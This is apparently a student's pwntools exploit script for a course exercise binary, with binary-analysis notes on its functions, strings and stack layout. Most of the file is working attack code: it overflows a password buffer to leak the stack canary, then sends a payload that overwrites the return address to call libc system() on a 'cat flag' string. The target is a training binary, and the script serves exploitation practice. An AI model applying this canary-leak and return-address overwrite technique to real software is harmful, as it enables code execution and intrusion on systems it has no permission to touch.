#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = 'handout/exercise4/exercise4b'
#exe = './exercise4b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()

# You can now communicate with the process, e.g.,
# r.sendline("AAAAA")
# r.recvline()
'''
arch     x86
baddr    0x400000
binsz    15395
bintype  elf
bits     64
canary   false
class    ELF64
compiler GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    NONE
sanitiz  false
static   false
stripped false
subsys   linux
va       true
'''
'''
0x00401276 60 sym.readLine
0x004012b2 139 sym.check_authorization
0x0040133d 74 sym.welcome
0x00401387 328 main
0x00401387 328 sym.main
0x004014d0 101 sym.__libc_csu_init
0x00401540 5 sym.__libc_csu_fini
0x00401548 13 sym._fini
'''

'''
0x00402008 27 str.Enter_the_secret_password:
0x00402028 39 str.Well_of_course__s_is_not_the_password
0x0040204f 9 str.imposter
0x00402058 13 str.Of_course...
0x00402065 22 str.Hi__what_s_your_name
0x0040207b 14 str.Welcome__s
0x00402089 26 str.Unauthorized._Try_again
'''
'''
Canary: 000000000040409c - 000000000040409f #4 bytes
name:   00000000004040a0 - 00000000004040c7 #40 bytes
'''
'''
Welcome:
puts("Hi, what's your name?")
fgets(name, 40, stdin)
printf("Welcome %s!\n\n", name)
'''
'''
check_authorization:
puts("Enter the secret password:")
printf("Well of course %s is not the password\n", pw)
strcmp(name, "imposter")
if equal:
        puts(Of course...")
canary check

'''
'''
main:
printf("Unauthorized. Try again\n\r")
'''

#idea: after reprogramming the return address, move "cat flag" into rdi
#this is done in check_authorization, when comparing name with string "imposter", and name is stored in rdi
#more precisly, we store the address at which name starts in rdi.
#observe that if the string is not equals to "imposter" then we skip puts(Of course...") (therefore skip reassigning rdi)
#, and if canary stays equal, we also avoid reassining rdi

i = 1;

print("Msg " + str(i) + ": ", end="")
i = i + 1
print(r.recvline()) #"Hi, what's your name?"

r.sendline(b"cat flag") #read string with fgets into name

print("Msg " + str(i) + ": ", end="")
i = i + 1
print(r.recvline()) #"Welcome %s!\n\n"

print("Msg " + str(i) + ": ", end="")
i = i + 1
print(r.recvline()) #"!\n"

print("Msg " + str(i) + ": ", end="")
i = i + 1
print(r.recvline()) #"\n"

print("Msg " + str(i) + ": ", end="") #5
i = i + 1
print(r.recvline()) #"Enter the secret password:\n"

#string is stored beginning at address rbp - 144;
#canary is stored beginning at address rbp - 8
r.sendline((144 - 8 - 1) * b"A") #read string with readline, readline appends \n so account for it (-1)

print("Msg " + str(i) + ": ", end="")
i = i + 1
print(r.recvline()) #"Well of course %s\n"

print("Msg " + str(i) + ": ", end="")
i = i + 1
canary_line = r.recvline()
print(canary_line) #"[canary] is not the password\n"

canary = canary_line[0:4] #first 4 bytes is canary value
print("Canary: ", end="")
print(canary)

print("Msg " + str(i) + ": ", end="")
i = i + 1
print(r.recvline()) #"Unauthorized. Try again\n"

print("Msg " + str(i) + ": ", end="") #9
i = i + 1
print(r.recvline()) #"\rEnter the secret password:\n"

pre_canary = (144 - 8) * b'A'
post_canary_frame = (8 - 4) * b'B'
main_rbp_value = 8 * b'C'
new_ret_address = p64(r.libc.symbols['system'], endian='little') #b"\x56\x12\x40\x00\x00\x00\x00\x00"
new_ret_address = new_ret_address + (8 - len(new_ret_address)) * b'\x00'

#https://wiki.osdev.org/System_V_ABI -> 16 byte stack alignment

#based on the analysis of previous task.

#From static analysis, use address of last instruction of main as the return address
#0x004014cf ->
ret_address_of_main = b'\xcf\x14\x40\x00'
ret_address_of_main = ret_address_of_main + (8 - len(ret_address_of_main)) * b"\x00"

# payload = pre_canary + canary + post_canary_frame + main_rbp_value + new_ret_address + ret_address_of_main #doesn't work
# payload = pre_canary + canary + post_canary_frame + main_rbp_value + new_ret_address + new_ret_address #doesn't work
payload = pre_canary + canary + post_canary_frame + main_rbp_value + ret_address_of_main + new_ret_address


print("Payload: ", end="")
print(payload)

r.sendline(payload)

print("Msg " + str(i) + ": ", end="")
i = i + 1
print(r.recvall(timeout=1))